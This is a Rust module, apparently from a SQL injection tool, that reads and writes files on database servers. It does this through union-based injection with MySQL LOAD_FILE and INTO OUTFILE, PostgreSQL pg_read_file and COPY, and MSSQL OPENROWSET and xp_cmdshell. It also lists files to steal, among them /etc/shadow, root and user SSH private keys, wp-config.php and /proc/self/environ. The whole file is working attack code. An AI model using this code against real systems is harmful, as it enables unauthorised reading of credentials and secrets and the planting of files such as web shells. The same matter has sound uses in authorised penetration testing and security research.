//! File system access through SQL injection

use crate::http::client::HttpClient;
use crate::sqli::core::DBMS;
use crate::sqli::techniques::union::{UnionVector, union_use};
use crate::sqli::request::Request;
use anyhow::Result;
use url::Url;

/// File access through SQL injection
pub struct FileAccess<'a> {
    client: &'a HttpClient,
    url: Url,
    parameter: String,
    vector: UnionVector,
}

impl<'a> FileAccess<'a> {
    pub fn new(client: &'a HttpClient, url: Url, parameter: String, vector: UnionVector) -> Self {
        Self {
            client,
            url,
            parameter,
            vector,
        }
    }

    /// Read a file from the database server
    pub async fn read_file(&self, filepath: &str) -> Result<Option<String>> {
        let request = Request::new(self.client, self.url.clone(), self.parameter.clone());
        
        let query = match self.vector.dbms {
            DBMS::MySQL => {
                // MySQL LOAD_FILE()
                format!("SELECT LOAD_FILE('{}')", filepath)
            }
            DBMS::PostgreSQL => {
                // PostgreSQL pg_read_file() - requires superuser
                format!("SELECT pg_read_file('{}')", filepath)
            }
            DBMS::MSSQL => {
                // MSSQL OPENROWSET - requires specific permissions
                format!(
                    "SELECT BulkColumn FROM OPENROWSET(BULK '{}', SINGLE_CLOB) AS x",
                    filepath
                )
            }
            _ => {
                return Err(anyhow::anyhow!("File read not supported for this DBMS"));
            }
        };

        let results = union_use(&request, &self.vector, &query).await?;
        
        if results.is_empty() || results[0].is_empty() {
            Ok(None)
        } else {
            Ok(Some(results[0].clone()))
        }
    }

    /// Write a file to the database server (dangerous!)
    pub async fn write_file(&self, filepath: &str, content: &str) -> Result<bool> {
        let request = Request::new(self.client, self.url.clone(), self.parameter.clone());
        
        let query = match self.vector.dbms {
            DBMS::MySQL => {
                // MySQL INTO OUTFILE
                format!(
                    "SELECT '{}' INTO OUTFILE '{}'",
                    content.replace('\'', "''"),
                    filepath
                )
            }
            DBMS::PostgreSQL => {
                // PostgreSQL COPY
                format!(
                    "COPY (SELECT '{}') TO '{}'",
                    content.replace('\'', "''"),
                    filepath
                )
            }
            DBMS::MSSQL => {
                // MSSQL xp_cmdshell with echo
                format!(
                    "EXEC xp_cmdshell 'echo {} > {}'",
                    content,
                    filepath
                )
            }
            _ => {
                return Err(anyhow::anyhow!("File write not supported for this DBMS"));
            }
        };

        // Execute the query - we don't expect results
        let _ = union_use(&request, &self.vector, &query).await;
        
        // We can't easily verify if write succeeded
        Ok(true)
    }

    /// Common files to try reading
    pub fn common_files() -> Vec<&'static str> {
        vec![
            // Linux
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/mysql/my.cnf",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/www/html/index.php",
            "/var/www/html/config.php",
            "/var/www/html/wp-config.php",
            "/home/user/.ssh/id_rsa",
            "/root/.ssh/id_rsa",
            "/proc/self/environ",
            // Windows
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\win.ini",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\xampp\\htdocs\\config.php",
            "C:\\wamp\\www\\config.php",
        ]
    }
}
